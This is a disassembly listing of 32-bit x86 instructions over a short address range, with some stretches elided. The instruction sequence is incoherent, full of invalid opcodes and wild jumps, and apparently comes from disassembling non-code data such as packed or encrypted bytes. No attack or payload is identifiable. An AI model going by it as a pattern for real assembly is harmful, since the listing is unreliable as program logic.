  42b478:	out    dx,eax
  42b479:	out    dx,eax
  42b47a:	into   
  42b47b:	gs jo  0x42b44e
  42b47e:	cld    
  42b47f:	test   DWORD PTR [eax],ebx
  42b481:	sti    
  42b482:	cmp    BYTE PTR [ebx-0x40],bl
  42b485:	into   
  42b486:	add    DWORD PTR [eax],eax
  42b488:	add    al,0x1
  42b48a:	add    BYTE PTR [eax],al
  42b48c:	pop    ss
  42b48d:	push   ebp
  42b48e:	fs clc 
  42b490:	adc    bl,BYTE PTR [edx+0x4d029a97]
  42b496:	xchg   DWORD PTR [esi+eiz*2-0x36],ebp
  42b49a:	xchg   edx,eax
  42b49b:	cmc    
  42b49c:	mov    ebp,0x3e4f845c
  42b4a1:	and    ch,BYTE PTR [ecx+0x31]
  42b4a4:	xchg   eax,esp
  42b4a6:	dec    eax
  42b4a7:	sub    DWORD PTR [esi+esi*1+0x4c],ecx
  42b4ab:	and    eax,0x3e6a7566
  42b4b0:	sbb    eax,0x91c5613b
  42b4b5:	clc    
  42b4b6:	or     al,0xc4
  42b4b8:	faddp  st(1),st
  42b4ba:	std    
  42b4bb:	fdiv   QWORD PTR [ebx+eiz*4+0x28de6bed]
  42b4c2:	add    DWORD PTR [eax],eax
  42b4c4:	sub    ah,ah
  42b4c6:	sub    eax,0x202a0ab
  42b4cb:	mov    eax,ds:0x408856ba
  42b4d0:	sub    BYTE PTR [eax-0x6175cb1b],dh
  42b4d6:	aad    0x11
  42b4d8:	push   ss
  42b4d9:	jno    0x42b46d
  42b4db:	mov    al,0x65
  42b4dd:	int3   
  42b4de:	dec    esp
  42b4df:	or     cl,dl
  42b4e1:	add    ah,ah
  42b4e3:	test   eax,0x2593ba73
  42b4e8:	out    dx,eax
  42b4e9:	dec    esp
  42b4ea:	pop    eax
  42b4eb:	mov    al,ds:0xd2aa3eea
  42b4f0:	rol    ch,1
  42b4f2:	add    al,0xd1
  42b4f4:	xor    eax,0x432660df
  42b4f9:	lock pop ecx
  42b4fb:	call   0x822f8a42
  42b500:	pop    ebx
  42b501:	ds int 0xf9
  42b504:	pushf  
  42b505:	jno    0x42b4ae
  42b507:	cmp    dl,BYTE PTR [esi]
  42b509:	leave  
  42b50a:	mov    ?,WORD PTR [esi-0x2a]
  42b50d:	into   
  42b50e:	cmp    cl,al
  42b510:	cmp    BYTE PTR [edx],0x71
  42b513:	iret   
  42b514:	je     0x42b4c5
  42b516:	retf   
  42b517:	and    BYTE PTR [ecx],ch
  42b519:	inc    edx
  42b51a:	mov    ebp,0xc0a7782d
  42b51f:	sub    al,0x4d
  42b521:	jb     0x42b4c8
  42b523:	fisttp QWORD PTR [edi-0x69]
  42b526:	scas   al,BYTE PTR es:[edi]
  42b527:	and    BYTE PTR [esi],al
  42b529:	loope  0x42b59e
  42b52b:	xor    bl,dh
  42b52d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b52e:	or     DWORD PTR [ebp-0x5b],ebx
  42b531:	(bad)  
  42b532:	popf   
  42b533:	ds adc bh,dh
  42b536:	fistp  DWORD PTR [edx]
  42b538:	jno    0x42b5b1
  42b53a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b53b:	inc    esi
  42b53c:	(bad)  
  42b53d:	fucomi st,st(3)
  42b53f:	ja     0x42b4cf
  42b541:	or     ecx,edx
  42b543:	adc    eax,0x2eb68d1a
  42b548:	out    dx,al
  42b549:	sub    dl,0xb5
  42b54c:	xchg   esi,eax
  42b54d:	stc    
  42b54e:	int    0x0
  42b550:	call   0xdbb:0x2976096d
  42b557:	pop    ebx
  42b558:	mov    edx,0xc6b3af69
  42b55d:	es sbb edx,ecx
  42b560:	fidivr WORD PTR [edi+0x7d]
  42b563:	push   esp
  42b564:	sbb    BYTE PTR [esi+0x6de22ac3],bl
  42b56a:	xor    al,0x83
  42b56c:	scas   eax,DWORD PTR es:[edi]
  42b56d:	and    al,0xf1
  42b56f:	in     eax,dx
  42b570:	popa   
  42b571:	jp     0x42b576
  42b573:	(bad)  
  42b574:	in     eax,0xc8
  42b576:	fucomi st,st(1)
  42b578:	ins    DWORD PTR es:[edi],dx
  42b579:	rol    BYTE PTR [ecx+0x32],0x93
  42b57d:	or     eax,0x6dc9e3c5
  42b582:	adc    eax,0x67b78c66
  42b587:	cmp    eax,DWORD PTR [esi+0x241ab519]
  42b58d:	sbb    eax,edi
  42b58f:	jb     0x42b591
	...
  42b5f1:	add    BYTE PTR [eax],al
  42b5f3:	add    al,ah
  42b5f5:	xchg   esp,eax
  42b5f6:	and    bh,cl
  42b5f8:	je     0x42b5f9
  42b5fa:	out    dx,eax
  42b5fb:	mov    edi,0x1397875f
  42b600:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b601:	mov    esi,0xcfc4324e
  42b606:	add    DWORD PTR [eax],eax
  42b608:	add    al,0x1
  42b60a:	add    BYTE PTR [eax],al
  42b60c:	shl    eax,1
  42b60e:	sahf   
  42b60f:	shr    esp,cl
  42b611:	mov    cl,0x7c
  42b613:	mov    WORD PTR [esi+0x5381abe2],cs
  42b619:	or     DWORD PTR [edx+0x70cf7e90],ebp
  42b61f:	mov    ecx,DWORD PTR [eax*4-0x4ad8c552]
  42b626:	xchg   ecx,eax
  42b627:	(bad)  
  42b629:	mov    BYTE PTR [edx+eiz*8+0x15],0x8
  42b62e:	cmp    ebx,DWORD PTR [edi-0x5d]
  42b631:	sbb    eax,0x1b687273
  42b636:	out    dx,al
  42b637:	jecxz  0x42b639
  42b639:	jmp    0x44bdfd0
  42b63e:	std    
  42b63f:	jmp    0x34e764df
  42b644:	sub    ecx,0xffffff88
  42b647:	xchg   ebx,eax
  42b648:	sti    
  42b649:	ins    BYTE PTR es:[edi],dx
  42b64a:	inc    esp
  42b64b:	ja     0x42b603
  42b64d:	shr    BYTE PTR [edi-0x5694cf52],cl
  42b653:	add    al,0x6
  42b655:	sahf   
  42b656:	fucomi st,st(4)
  42b658:	add    DWORD PTR [edi],ebp
  42b65a:	cmp    BYTE PTR ds:0x5a565bd8,0x4d
  42b661:	call   0x4591:0xa267b1c3
  42b668:	test   esi,ecx
  42b66a:	adc    eax,ecx
  42b66c:	mov    esi,0x25c0194d
  42b671:	ffreep st(1)
  42b673:	mov    eax,ds:0xef892dfc
  42b678:	push   0xffffffc4
  42b67a:	adc    DWORD PTR [edi+ebx*4],ebx
  42b67d:	jecxz  0x42b6ce
  42b67f:	add    al,0x28
  42b681:	fld    QWORD PTR [ebx+0x2bd6d4e5]
  42b687:	je     0x42b62d
  42b689:	jae    0x42b6e2
  42b68b:	lock (bad) 
  42b68d:	in     eax,0xe7
  42b68f:	and    ecx,DWORD PTR [ebp+0x48]
  42b692:	and    al,0x40
  42b694:	je     0x42b64d
  42b696:	mov    cl,0x43
  42b698:	push   DWORD PTR [esi-0x6b]
  42b69b:	ss leave 
  42b69d:	mov    cs,WORD PTR [eax]
  42b69f:	inc    edi
  42b6a0:	sub    eax,DWORD PTR [ebx-0x24]
  42b6a3:	sti    
  42b6a4:	inc    edx
  42b6a5:	jb     0x42b6fa
  42b6a7:	pop    ds
  42b6a8:	dec    edi
  42b6a9:	sub    DWORD PTR [esp+edi*4+0x3c],edi
  42b6ad:	and    al,0x36
  42b6af:	xor    DWORD PTR [ecx+0x68b30632],0xffffffe2
  42b6b6:	hlt    
  42b6b7:	push   cs
  42b6b8:	xor    al,0x1c
  42b6bb:	push   0x8aa087d7
  42b6c0:	dec    esp
  42b6c1:	iret   
  42b6c2:	pop    ss
  42b6c3:	lods   eax,DWORD PTR ds:[esi]
  42b6c4:	lahf   
  42b6c5:	out    0x9d,eax
  42b6c7:	jne    0x42b6f6
  42b6c9:	sahf   
  42b6ca:	jp     0x42b6b6
  42b6cc:	xchg   edx,eax
  42b6cd:	adc    bl,BYTE PTR [ebp+ecx*8+0x7f80c9bf]
  42b6d4:	mov    WORD PTR [eax+0x7b],?
  42b6d7:	sbb    esp,DWORD PTR [eax+0x24b7aa85]
  42b6dd:	arpl   bx,ax
  42b6df:	mov    BYTE PTR [edi-0x39],ah
  42b6e2:	jle    0x42b684
  42b6e4:	pushf  
  42b6e5:	lods   eax,DWORD PTR ds:[esi]
  42b6e6:	push   0x4b
  42b6e8:	out    0xba,eax
  42b6ea:	pop    ebx
  42b6eb:	repz inc esp
  42b6ed:	jp     0x42b74e
  42b6ef:	shl    DWORD PTR [eax-0x46],0xc0
  42b6f3:	ss adc al,0x83
  42b6f6:	and    ecx,esp
  42b6f8:	outs   dx,BYTE PTR ds:[esi]
  42b6f9:	xchg   DWORD PTR ds:0x128d7252,edi
  42b6ff:	cmp    DWORD PTR [ecx],ebp
  42b701:	mov    fs,WORD PTR [esi+0x5b]
  42b704:	adc    eax,0x86fb5429
  42b709:	mov    WORD PTR [esi+0x69],?
  42b70c:	mov    dl,0xbb
  42b70e:	inc    ebx
  42b70f:	mov    dh,0x0
	...
  42b771:	add    BYTE PTR [eax],al
  42b773:	add    BYTE PTR [esi+0x42],cl
  42b776:	dec    ecx
  42b777:	daa    
  42b778:	dec    ebp
  42b779:	das    
  42b77a:	outs   dx,BYTE PTR ds:[esi]
  42b77b:	imul   edx,edx,0x63
  42b77e:	push   ecx
  42b77f:	xchg   edx,eax
  42b780:	(bad)  [esi-0x3d]
  42b783:	in     al,dx
  42b784:	enter  0x1d0,0x0
  42b788:	add    al,0x1
  42b78a:	add    BYTE PTR [eax],al
  42b78c:	mov    ebp,0x2bee37af
  42b791:	addr16 or al,0xf1
  42b794:	pusha  
  42b795:	mov    ch,0xb6
  42b797:	pop    ds
  42b798:	pop    edx
  42b799:	jl     0x42b73d
  42b79b:	pop    es
  42b79c:	pop    ebp
  42b79d:	ins    BYTE PTR es:[edi],dx
  42b79e:	repz mov esi,0x9e18e339
  42b7a4:	rol    BYTE PTR ds:0x53b95046,1
  42b7aa:	fdivr  QWORD PTR ds:0xa232c53c
  42b7b0:	mov    al,0x5d
  42b7b2:	sub    BYTE PTR [ecx+ecx*4-0x16],0x8
  42b7b7:	mov    al,BYTE PTR [ebp+0x5e177e94]
  42b7bd:	jmp    0x945b2933
  42b7c2:	std    
  42b7c3:	add    eax,eax
  42b7c5:	dec    edx
  42b7c6:	mov    bl,0xb5
  42b7c8:	push   edx
  42b7c9:	rcl    BYTE PTR ds:[edi],cl
  42b7cc:	and    dl,BYTE PTR [ebx]
  42b7ce:	inc    ebx
  42b7cf:	mov    ah,0x5f
  42b7d1:	cs nop
  42b7d3:	(bad)  
  42b7d4:	dec    eax
  42b7d5:	sub    cl,BYTE PTR [edx]
  42b7d7:	xchg   ebp,eax
  42b7d8:	lock xchg esi,eax
  42b7da:	xor    BYTE PTR [ebp+0x781bac13],dl
  42b7e0:	push   ds
  42b7e1:	xchg   ebp,eax
  42b7e2:	jnp    0x42b781
  42b7e4:	mov    esi,0x42cee060
  42b7e9:	mov    esi,0xf0886e89
  42b7ee:	retf   
  42b7ef:	test   ch,dl
  42b7f1:	jecxz  0x42b784
  42b7f3:	imul   edi,DWORD PTR [eax+0x42734e58],0x59
  42b7fa:	mov    al,ds:0x4a02f281
  42b7ff:	jae    0x42b7f0
  42b801:	call   0x38f4b4ae
  42b806:	add    eax,0xf4f0269b
  42b80b:	rcl    BYTE PTR [eax+0x3f4d533d],1
  42b811:	and    eax,DWORD PTR [ecx-0x6b43ddd7]
  42b817:	aad    0x3a
  42b819:	push   0x3ec30c0d
  42b81e:	scas   ax,WORD PTR es:[edi]
  42b820:	loop   0x42b7ec
  42b822:	jns    0x42b7f8
  42b824:	or     eax,0x3ca543c8
  42b829:	(bad)  
  42b82a:	pop    ds
  42b82b:	imul   esp,DWORD PTR [ecx+0x25],0x61baff58
  42b832:	stos   DWORD PTR es:[edi],eax
  42b833:	adc    ebx,DWORD PTR [ebp+0x47c5b331]
  42b839:	hlt    
  42b83a:	push   edi
  42b83b:	sbb    eax,0xfac9563b
  42b840:	popf   
  42b841:	and    al,0xc6
  42b843:	mov    fs,WORD PTR [ecx+0x59]
  42b846:	mov    BYTE PTR [ebp+0xda1275e],bh
  42b84c:	int3   
  42b84d:	pop    ebp
  42b84e:	arpl   WORD PTR [eax+0x11],si
  42b851:	sub    eax,esi
  42b853:	jecxz  0x42b7fe
  42b855:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b856:	or     ebp,ecx
  42b858:	pushf  
  42b859:	mov    esp,0x7d5ce507
  42b85e:	int    0xa6
  42b860:	(bad)  
  42b861:	sub    al,0x46
  42b863:	outs   dx,BYTE PTR ds:[esi]
  42b864:	ret    0x7665
  42b867:	mov    ch,0x3f
  42b869:	fwait
  42b86a:	xchg   BYTE PTR [ebx],ch
  42b86c:	xchg   DWORD PTR [ecx+0x2d2d7a96],ebx
  42b872:	fld    QWORD PTR ds:0xfe8395ab
  42b878:	shl    ah,cl
  42b87a:	sub    DWORD PTR [esi],ecx
  42b87c:	adc    al,0x1e
  42b87e:	fcomp  st(7)
  42b880:	lods   al,BYTE PTR ds:[esi]
  42b881:	call   0x9c26:0x6484ddc9
  42b888:	nop
  42b889:	enter  0x1af6,0x1d
  42b88d:	mov    fs,WORD PTR [eax+0x40]
	...
  42b8f4:	call   0x2a7796
  42b8f9:	out    0xf9,eax
  42b8fb:	lahf   
  42b8fc:	ret    0x608c
  42b8ff:	or     ebp,DWORD PTR [edi]
  42b901:	aam    0x2b
  42b903:	inc    esi
  42b904:	int3   
  42b905:	rol    DWORD PTR [ecx],1
  42b907:	add    BYTE PTR [ecx+eax*1],al
  42b90a:	add    BYTE PTR [eax],al
  42b90c:	xor    al,0x1e
  42b90e:	dec    edx
  42b90f:	push   cs
  42b910:	inc    ebp
  42b911:	adc    al,0x37
  42b913:	fstp   st(7)
  42b915:	inc    esp
  42b916:	fs mov edx,0xef9f09c7
  42b91c:	test   al,0x68
  42b91e:	or     edx,edi
  42b920:	rcl    DWORD PTR [esi],0x8e
  42b923:	xchg   esp,edx
  42b925:	lds    edi,FWORD PTR [ecx-0x61]
  42b928:	cmp    edi,edx
  42b92a:	jbe    0x42b99a
  42b92c:	fimul  WORD PTR [bx+di]
  42b92f:	repz scas al,BYTE PTR es:[edi]
  42b931:	aad    0xb
  42b933:	fisub  DWORD PTR [ebp-0x1ff20175]
  42b939:	xchg   ebx,eax
  42b93a:	gs aas 
  42b93c:	xchg   esi,eax
  42b93d:	dec    ecx
  42b93e:	retf   
  42b93f:	dec    edi
  42b940:	sahf   
  42b941:	push   0x182ace91
  42b946:	ror    ebx,1
  42b948:	adc    dh,BYTE PTR [edx+eiz*2+0x75fae0d5]
  42b94f:	imul   eax,DWORD PTR [edi-0x39856a62],0x6e0fff49
  42b959:	fcomp  QWORD PTR [edx-0x63]
  42b95c:	mov    dh,0x5b
  42b95e:	scas   eax,DWORD PTR es:[edi]
  42b95f:	test   al,0xe
  42b961:	loope  0x42b8ee
  42b963:	in     eax,0xa5
  42b965:	jnp    0x42b93b
  42b967:	not    edi
  42b969:	sti    
  42b96a:	(bad)  
  42b96b:	mov    ds:0xa7a4dc3,al
  42b970:	loopne 0x42b904
  42b972:	mov    cl,0x77
  42b974:	sub    eax,0xd9507908
  42b979:	fstp   QWORD PTR ds:0xf038fce8
  42b97f:	push   esp
  42b980:	(bad)  
  42b981:	and    al,0xe2
  42b983:	bound  ecx,QWORD PTR cs:[ebp+0x16]
  42b987:	stos   DWORD PTR es:[edi],eax
  42b988:	jmp    0x42b95a
  42b98a:	lods   eax,DWORD PTR ds:[esi]
  42b98b:	xchg   ebx,eax
  42b98c:	mov    edx,0xc41c7ec3
  42b991:	sbb    DWORD PTR [edi+0x393ff3fd],edi
  42b997:	or     DWORD PTR [edx],esi
  42b999:	mov    WORD PTR [esi-0x4e],?
  42b99c:	cmp    DWORD PTR ds:0x5832c0a4,ebp
  42b9a2:	add    ebx,DWORD PTR [ebp+0xe]
  42b9a5:	jbe    0x42b9ac
  42b9a7:	out    dx,eax
  42b9a8:	jmp    0xb162c928
  42b9ad:	mov    esi,0xde1f70da
  42b9b2:	div    BYTE PTR [eax-0x72]
  42b9b5:	shl    ebp,1
  42b9b7:	mov    al,0x7d
  42b9b9:	(bad)  
  42b9ba:	(bad)  
  42b9bb:	sbb    esp,DWORD PTR [edx]
  42b9bd:	or     al,0xf1
  42b9bf:	jmp    0x24d2:0xb891a40d
  42b9c6:	in     al,dx
  42b9c7:	or     DWORD PTR [eax+0x66],esi
  42b9ca:	sub    BYTE PTR [edx-0x1ae6bea3],bl
  42b9d0:	or     al,BYTE PTR [edx+eiz*8+0x6d]
  42b9d4:	fdivr  DWORD PTR [edi-0x39b21a51]
  42b9da:	mov    eax,0x5ed0e4b8
  42b9df:	scas   eax,DWORD PTR es:[edi]
  42b9e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b9e1:	xchg   ecx,eax
  42b9e2:	inc    ebx
  42b9e3:	aam    0xe0
  42b9e5:	mov    bh,0x9c
  42b9e7:	scas   eax,DWORD PTR es:[edi]
  42b9e8:	mov    eax,0x67152bf0
  42b9ed:	jb     0x42b9e7
  42b9ef:	or     edi,esp
  42b9f1:	or     esi,DWORD PTR [esi-0x1c7d2daa]
  42b9f7:	push   0xffffffa8
  42b9f9:	and    DWORD PTR [edi+0x2143dc1e],0xe1c1ca6f
  42ba03:	in     eax,dx
  42ba04:	mul    BYTE PTR [esp+edi*2]
  42ba07:	xchg   DWORD PTR [edx+ebx*4],eax
  42ba0a:	push   ebx
  42ba0b:	dec    ebp
  42ba0c:	push   ecx
  42ba0d:	and    dl,BYTE PTR [edi+0x29]
	...
  42ba74:	mov    eax,DWORD PTR [edi]
  42ba76:	mov    al,0xe2
  42ba78:	mov    esp,0x6a6fdbf7
  42ba7d:	pop    ebx
  42ba7e:	xchg   ecx,eax
  42ba7f:	or     DWORD PTR [edi-0x2fd22424],edi
  42ba85:	rol    BYTE PTR [ecx],cl
  42ba87:	add    BYTE PTR [ecx+eax*1],al
  42ba8a:	add    BYTE PTR [eax],al
  42ba8c:	stc    
  42ba8d:	(bad)  
  42ba8f:	sahf   
  42ba90:	and    edx,DWORD PTR [ecx+0x13]
  42ba93:	cwde   
  42ba94:	sub    ch,BYTE PTR [edi-0x75]
  42ba97:	sbb    BYTE PTR [edi+0x4],bh
  42ba9a:	pusha  
  42ba9b:	fsub   QWORD PTR [eax+0x66ff05b3]
  42baa1:	or     ebp,DWORD PTR [ecx-0x75dcf5df]
  42baa7:	dec    eax
  42baa8:	hlt    
  42baa9:	mov    bh,0x9f
  42baab:	cmp    cl,cl
  42baad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42baae:	int    0xc4
  42bab0:	xchg   esp,eax
  42bab1:	sbb    DWORD PTR cs:[ecx+0x63b8b3ee],ebx
  42bab8:	aad    0xbe
  42baba:	mov    ah,0xbe
  42babc:	or     BYTE PTR [ebx-0x669a9fc8],0x6c
  42bac3:	push   cs
  42bac4:	xor    BYTE PTR [eax-0x47760dea],dh
  42baca:	repnz test BYTE PTR [eax],bl
  42bacd:	fisub  WORD PTR [ebx+0x1c]
  42bad0:	lods   eax,DWORD PTR ds:[esi]
  42bad1:	mov    ebx,0xb091b56a
  42bad6:	sub    ebp,esp
  42bad8:	pop    edi
  42bad9:	dec    ecx
  42bada:	mov    esp,0xc8360067
  42badf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42bae0:	jne    0x42bb38
  42bae2:	fldenv [edi-0x73]
  42bae5:	lock push 0xb98f9fea
  42baeb:	data16 mov bl,0x8b
  42baee:	add    dl,BYTE PTR [eax-0x44cb81eb]
  42baf4:	pop    esp
  42baf5:	sbb    BYTE PTR [esi],bh
  42baf7:	or     al,BYTE PTR [edi]
  42baf9:	int3   
  42bafa:	(bad)
  42bafe:	cdq    
  42baff:	push   ss
  42bb00:	mov    eax,ds:0x1d90236
  42bb05:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42bb06:	popf   
  42bb07:	imul   ebp,DWORD PTR [ebx],0x20de30c8
  42bb0d:	test   dh,0xb7
  42bb10:	mov    bh,0xb8
  42bb12:	ins    BYTE PTR es:[edi],dx
  42bb13:	jb     0x42bb7d
  42bb15:	inc    ebp
  42bb16:	sub    DWORD PTR [esi-0x4d],ebp
  42bb19:	and    ecx,DWORD PTR [ecx-0x14]
  42bb1c:	rol    BYTE PTR [ecx],0x1a
  42bb1f:	mov    ch,ch
  42bb21:	cli    
  42bb22:	div    BYTE PTR [edx+0x61]
  42bb25:	das    
  42bb26:	fistp  DWORD PTR [eax-0x56893316]
  42bb2c:	jae    0x42bb3a
  42bb2e:	mov    ch,0x47
  42bb30:	lods   al,BYTE PTR ds:[esi]
  42bb31:	jmp    0x7ddd:0x4e1a00f6
  42bb38:	add    eax,0x13f406fc
  42bb3d:	aam    0x38
  42bb3f:	pop    esi
  42bb40:	into   
  42bb41:	ror    BYTE PTR [ecx+ecx*1+0x18f86982],0xc6
  42bb49:	stos   BYTE PTR es:[edi],al
  42bb4a:	xchg   edx,eax
  42bb4b:	shr    DWORD PTR [ebp+0x10],cl
  42bb4e:	and    eax,0x373c606a
  42bb53:	in     al,dx
  42bb54:	xchg   ebx,eax
  42bb55:	popa   
  42bb56:	repz ror BYTE PTR [ebx+0x55],cl
  42bb5a:	add    eax,0x77d48795
  42bb5f:	mov    dl,0xb6
  42bb61:	stc    
  42bb62:	xchg   DWORD PTR [ebx-0x60fc0a09],ecx
  42bb68:	sbb    al,0xf
  42bb6a:	ret    0x77f7
  42bb6d:	adc    BYTE PTR [ebx+eiz*4+0x555b93a],al
  42bb74:	cmp    eax,0x8eb6f933
  42bb79:	stos   DWORD PTR es:[edi],eax
  42bb7a:	sbb    ch,cl
  42bb7c:	mov    dl,0xbd
  42bb7e:	stc    
  42bb7f:	bound  edx,QWORD PTR [ebp+eiz*1+0x318f17ba]
  42bb86:	push   es
  42bb87:	or     edi,DWORD PTR [esp+esi*2+0x2b6d9e38]
  42bb8e:	adc    al,0x0
	...
  42bbf4:	xor    al,0x28
  42bbf6:	add    DWORD PTR [esi],eax
  42bbf8:	sbb    eax,0x233a372f
  42bbfd:	sub    DWORD PTR [ebx],eax
  42bbff:	dec    ecx
  42bc00:	and    eax,0xd48a35db
  42bc05:	rol    DWORD PTR [ecx],cl
  42bc07:	add    BYTE PTR [ecx+eax*1],al
  42bc0a:	add    BYTE PTR [eax],al
  42bc0c:	push   cs
  42bc0d:	(bad)  
  42bc0e:	int    0xe7
  42bc10:	popa   
  42bc11:	addr16 mov cs,edx
  42bc14:	ror    edx,cl
  42bc16:	fld    st(4)
  42bc18:	cdq    
  42bc19:	inc    eax
  42bc1a:	add    DWORD PTR cs:[ebx-0x2d14a686],0x14
  42bc22:	icebp  
  42bc23:	pusha  
  42bc24:	(bad)  
  42bc25:	mov    esi,0xd667c3d1
  42bc2a:	test   DWORD PTR [ebx],0x27076e36
  42bc30:	mov    dl,0x30
  42bc32:	and    eax,0xafa8f55d
  42bc37:	jge    0x42bc64
  42bc39:	fsub   st(5),st
  42bc3b:	sub    ebp,DWORD PTR [edx-0x1f]
  42bc3e:	out    0xc1,eax
  42bc40:	xchg   edi,eax
  42bc41:	std    
  42bc42:	inc    edi
  42bc43:	sbb    ch,BYTE PTR [ebx+0x62]
  42bc46:	scas   eax,DWORD PTR es:[edi]
  42bc47:	pop    eax
  42bc48:	stc    
  42bc49:	ds test al,ah
  42bc4c:	int3   
  42bc4d:	push   0xffffffd9
  42bc4f:	mov    esi,0x79430ccc
  42bc54:	xchg   ebp,eax
  42bc55:	jb     0x42bc57
  42bc57:	fild   QWORD PTR [ecx]
  42bc59:	imul   edx,DWORD PTR [edx-0x1cf5988f],0xffffffea
  42bc60:	xchg   DWORD PTR [ecx+0x49],ebx
  42bc63:	or     ebx,DWORD PTR [edi]
  42bc65:	push   cs
  42bc66:	mov    esp,0xafb71ab
  42bc6b:	jmp    0xf7d2343a
  42bc70:	test   DWORD PTR [edx-0x4d3347af],ebx
  42bc76:	rol    bh,1
  42bc78:	xchg   ecx,eax
  42bc79:	test   BYTE PTR [eax+0x70],0x1
  42bc7d:	and    BYTE PTR [esi+0x2c],0x80
  42bc81:	mov    BYTE PTR [ecx+0x5d],ah
  42bc84:	leave  
  42bc85:	push   esi
  42bc86:	test   eax,0x2da71c7
  42bc8b:	fstp   DWORD PTR [eax+0x4e2fa60e]
  42bc91:	mov    DWORD PTR [esi],edi
  42bc93:	je     0x42bc4c
  42bc95:	mov    al,ds:0x67dda319
  42bc9a:	jns    0x42bc2e
  42bc9c:	or     edi,DWORD PTR [ebp+0x26]
  42bc9f:	mov    WORD PTR [edx+0x75],?
  42bca2:	pop    esp
  42bca3:	fs push 0x59236931
  42bca9:	dec    DWORD PTR [ebp-0x41eeb54b]
  42bcaf:	imul   edx,eax,0xfffffff4
  42bcb2:	repz dec edi
  42bcb4:	mov    cl,0x15
  42bcb6:	(bad)  
  42bcb7:	inc    eax
  42bcb8:	bound  esi,QWORD PTR [ecx+0x31b6d7ce]
  42bcbe:	xor    al,0xfd
  42bcc0:	mov    DWORD PTR [edi],ebp
  42bcc2:	pop    edi
  42bcc3:	sbb    al,0xe8
  42bcc5:	and    edi,edx
  42bcc7:	js     0x42bcfd
  42bcc9:	pop    esi
  42bcca:	jnp    0x42bd17
  42bccc:	add    edi,DWORD PTR [esi+esi*8+0x4959776c]
  42bcd3:	test   BYTE PTR [edx-0x2f],0x72
  42bcd7:	dec    ecx
  42bcd8:	xchg   esi,eax
  42bcd9:	and    al,0x98
  42bcdb:	std    
  42bcdc:	out    dx,eax
  42bcdd:	and    al,0x5d
  42bcdf:	and    DWORD PTR [ebp+0x47],0xa64fa2fd
  42bce6:	mov    ds:0xd7dfe931,eax
  42bceb:	xchg   esp,eax
  42bcec:	or     ecx,DWORD PTR [ecx]
  42bcee:	das    
  42bcef:	jp     0x42bcf1
  42bcf1:	cmp    ah,BYTE PTR [esi-0x787fa649]
  42bcf7:	inc    ebp
  42bcf8:	jmp    0x42bd76
  42bcfa:	or     DWORD PTR [esi+0x50892757],ebp
  42bd00:	mov    al,BYTE PTR fs:[ebp+0x555927c1]
  42bd07:	popa   
  42bd08:	stos   DWORD PTR es:[edi],eax
  42bd09:	sbb    al,0xb8
  42bd0b:	int    0x29
  42bd0d:	inc    ebp
  42bd0e:	mov    esi,0xf0
	...
  42bd73:	add    BYTE PTR [eax-0x61eb634a],dh
  42bd79:	ds mov eax,0xffec3b6
  42bd7f:	jae    0x42bddf
  42bd81:	jns    0x42bd1b
  42bd83:	cwde   
  42bd84:	fcom   st(4)
  42bd86:	add    DWORD PTR [eax],eax
  42bd88:	add    al,0x1
  42bd8a:	add    BYTE PTR [eax],al
  42bd8c:	cmp    bl,BYTE PTR [esi-0x2a]
  42bd8f:	neg    BYTE PTR [edx]
  42bd91:	fadd   st,st(7)
  42bd93:	cdq    
  42bd94:	jg     0x42bda3
  42bd96:	mov    ecx,edi
  42bd98:	aas    
  42bd99:	xor    DWORD PTR [ebx],esi
  42bd9b:	outs   dx,BYTE PTR ds:[esi]
  42bd9c:	in     al,0x7b
  42bd9e:	dec    esi
  42bd9f:	jnp    0x42bdc7
  42bda1:	aaa    
  42bda2:	sub    eax,0xbfef6580
  42bda7:	push   ss
  42bda8:	jno    0x42bd8a
  42bdaa:	enter  0x4f6a,0xda
  42bdae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42bdaf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42bdb0:	in     al,0x35
  42bdb2:	loope  0x42be2b
  42bdb4:	dec    eax
  42bdb5:	repnz in eax,0x4
  42bdb8:	cs int 0xc7
  42bdbb:	jmp    0x42be24
  42bdbd:	(bad)  
  42bdbe:	sbb    al,0xe3
  42bdc0:	mov    DWORD PTR [ecx],esp
  42bdc2:	mov    eax,0xc5d7f27b
  42bdc7:	and    al,0x19
  42bdc9:	fnstsw WORD PTR ds:0x2b45b3b9
  42bdcf:	fstp   TBYTE PTR [esi]
  42bdd1:	test   BYTE PTR [esi+0x76],0xf3
  42bdd5:	push   es
  42bdd6:	jmp    0x173ed08c
  42bddb:	fcmovu st,st(2)
  42bddd:	repz test DWORD PTR [esi],esp
  42bde0:	push   0xa989f1ba
  42bde5:	mov    WORD PTR [ecx],fs
  42bde7:	or     al,BYTE PTR [edx]
  42bde9:	xor    dl,BYTE PTR [eax-0x50745ba3]
  42bdef:	and    al,0x8b
  42bdf1:	daa    
  42bdf2:	enter  0xee61,0xc6
  42bdf6:	xchg   edi,eax
  42bdf7:	pop    ebx
  42bdf8:	pusha  
  42bdf9:	(bad)
  42bdfd:	cmp    DWORD PTR [esi],esi
  42bdff:	mov    ch,0x54
  42be01:	dec    ebp
  42be02:	div    DWORD PTR [esi]
  42be04:	test   BYTE PTR [ebx],al
  42be06:	adc    al,0x14
  42be08:	lahf   
  42be09:	and    DWORD PTR [eax],ebx
  42be0b:	and    DWORD PTR ss:[eax+0xbec44bb],ecx
  42be12:	cmp    edx,DWORD PTR [edx-0x74cbc2b4]
  42be18:	xor    cl,ah
  42be1a:	enter  0x3778,0xa6
  42be1e:	fwait
  42be1f:	arpl   WORD PTR [eax+0xc2b41e3],dx
  42be25:	pusha  
  42be26:	pop    edx
  42be27:	scas   eax,DWORD PTR es:[edi]
  42be28:	or     dh,al
  42be2a:	push   edi
  42be2b:	mov    ebx,0x378bfe93
  42be30:	push   es
  42be31:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42be32:	adc    al,0x60
  42be34:	mov    ds:0xf40e9375,al
  42be39:	jle    0x42be7b
  42be3b:	add    cl,bl
  42be3d:	pop    edi
  42be3e:	jge    0x42beba
  42be40:	popf   
